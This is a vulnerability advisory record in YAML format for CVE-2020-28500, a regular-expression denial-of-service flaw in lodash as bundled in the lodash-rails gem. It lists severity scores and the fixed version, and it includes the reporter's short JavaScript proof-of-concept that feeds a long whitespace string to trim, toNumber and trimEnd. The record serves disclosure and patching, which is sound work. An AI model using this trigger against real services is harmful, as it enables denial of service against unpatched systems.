advisory_id: gems/lodash-rails/CVE-2020-28500
datasource_id: ruby_importer_v2/gems/lodash-rails/CVE-2020-28500
datasource_url: https://github.com/rubysec/ruby-advisory-db/blob/master/gems/lodash-rails/CVE-2020-28500.yml
aliases:
  - CVE-2020-28500
  - GHSA-29mw-wpgm-hmr9
summary: |
  Regular Expression Denial of Service (ReDoS) in lodash
  All versions of package lodash prior to 4.17.21 are vulnerable
  to Regular Expression Denial of Service (ReDoS) via the
  `toNumber`, `trim` and `trimEnd` functions.

  Steps to reproduce (provided by reporter Liyuan Chen):

  ```
    var lo = require('lodash');

    function build_blank(n) {
       var ret = "1"
       for (var i = 0; i < n; i++) {
           ret += " "
       }
       return ret + "1";
   }
   var s = build_blank(50000) var time0 = Date.now();
   lo.trim(s)
   var time_cost0 = Date.now() - time0;
   console.log("time_cost0: " + time_cost0);
   var time1 = Date.now();
   lo.toNumber(s) var time_cost1 = Date.now() - time1;
   console.log("time_cost1: " + time_cost1);
   var time2 = Date.now();
   lo.trimEnd(s);
   var time_cost2 = Date.now() - time2;
   console.log("time_cost2: " + time_cost2);
  ```
impacted_packages:
  - purl: pkg:gem/lodash-rails
    affected_versions:
    fixed_versions: vers:gem/>=4.17.21
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '5.0'
    scoring_system: cvssv2
    scoring_elements:
    published_at: None
    url:
  - score: '5.3'
    scoring_system: cvssv3
    scoring_elements:
    published_at: None
    url:
weaknesses: []
references:
  - url: https://github.com/advisories/GHSA-29mw-wpgm-hmr9
    reference_type:
    reference_id:
